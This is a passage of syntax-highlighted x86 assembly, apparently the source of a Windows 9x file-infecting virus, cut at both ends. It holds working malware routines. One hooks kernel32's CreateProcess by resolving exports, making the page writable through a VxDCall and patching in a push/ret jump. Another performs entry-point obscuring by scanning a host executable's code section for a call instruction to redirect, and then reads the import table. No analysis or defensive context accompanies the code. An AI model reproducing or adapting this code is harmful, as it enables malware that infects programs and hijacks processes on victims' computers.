    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1Ch</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; get ra of table with </span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32address</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">addressoffunctions</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; function addresses</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; get ra of table with</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32address</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">addressofnames</span><span class="sc4">],</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; pointers to names </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; get ra of table with</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32address</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">addressofordinals</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; pointers to ordinals</span><span class="sc0">

    </span><span class="sc5">BeginApiAddressSearch</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">addressofnames</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; search for </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AONindex</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">           </span><span class="sc1">; API in names</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">; table</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32address</span><span class="sc4">]</span><span class="sc0">
    
    </span><span class="sc5">HookCreateProcess</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc5">OkTryAgain</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hookstruct</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc5">MatchByteNow</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmpsb</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NextOneNow</span><span class="sc0">                  
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; did the entire string</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">YesGotIt</span><span class="sc0">                 </span><span class="sc1">; match ?</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">MatchByteNow</span><span class="sc0">

    </span><span class="sc5">NextOneNow</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                      
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AONindex</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">       </span><span class="sc1">; get next namepointer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AONindex</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; in table (4 dwords)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32address</span><span class="sc4">]</span><span class="sc0">                    
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">OkTryAgain</span><span class="sc0">

    </span><span class="sc5">YesGotIt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">addressofordinals</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; ordinal = nameindex *</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                    </span><span class="sc1">; size of ordinal entry</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">; + ordinal table base</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; offset of address</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                  </span><span class="sc1">; of function = ordinal</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">addressoffunctions</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; * size of entry of</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">; address table</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; get address</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32address</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hookstruct</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc5">SetApiHook</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12d</span><span class="sc0">

    </span><span class="sc5">ModifyPagePermissions</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">20060000h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000001h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0001000dh</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AVxdcall0A</span><span class="sc4">]</span><span class="sc0">   

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFFFh</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">SaveCreateProcessApiCode</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ApiHookError</span><span class="sc0">

    </span><span class="sc5">SaveCreateProcessApiCode</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hookstruct</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hookstruct</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06h</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

    </span><span class="sc5">PrepareCreateProcessApiCode</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hookstruct</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hookstruct</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0c3h</span><span class="sc0">

    </span><span class="sc5">ChangeCreateProcessApiCode</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hookstruct</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hookstruct</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06h</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

    </span><span class="sc5">ApiHookError</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
   
</span><span class="sc5">HOOK_API</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">CREATE_EPO</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc5">LocateCodeSectionHeader</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ip_original</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FIND_SECTION</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ExitEpoRoutine</span><span class="sc0">

    </span><span class="sc1">; edi = start of code section header</span><span class="sc0">
    
    </span><span class="sc5">GetPointerToRawData</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12d</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; eax = rva cs</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">epo_cs_rva</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16d</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; raw size of code section</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cs_rawsize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20d</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; RVA to raw data of code section</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mapaddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">epo_cs_pa</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ip_original</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">epo_cs_rva</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc1">; esi = physical address to raw data of code section</span><span class="sc0">
    </span><span class="sc1">; ecx = size of raw data of code section</span><span class="sc0">

    </span><span class="sc5">ScanForOpcode</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">epo_opcode</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">FoundOpcode</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">ScanForOpcode</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">; eax = 0 = error</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitEpoRoutine</span><span class="sc0">              </span><span class="sc1">; not found</span><span class="sc0">

    </span><span class="sc5">FoundOpcode</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc1">; esi = physical address of [xxxx] in code section</span><span class="sc0">

    </span><span class="sc5">ExamineAddress</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">epo_aoc_pa</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">; address of call</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">epo_awaa_va</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; address where api address</span><span class="sc0">

    </span><span class="sc1">;pushad</span><span class="sc0">
    </span><span class="sc1">;call MSG_BEEP</span><span class="sc0">
    </span><span class="sc1">;popad</span><span class="sc0">

    </span><span class="sc1">; on stack: esi, ecx</span><span class="sc0">

    </span><span class="sc5">GetRVAImportTable</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; rva of import table</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FIND_SECTION</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> 
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NotFound</span><span class="sc0">

    </span><span class="sc1">; edx = va of import section</span><span class="sc0">
    </span><span class="sc1">; ecx = size of import section</span><span class="sc0">
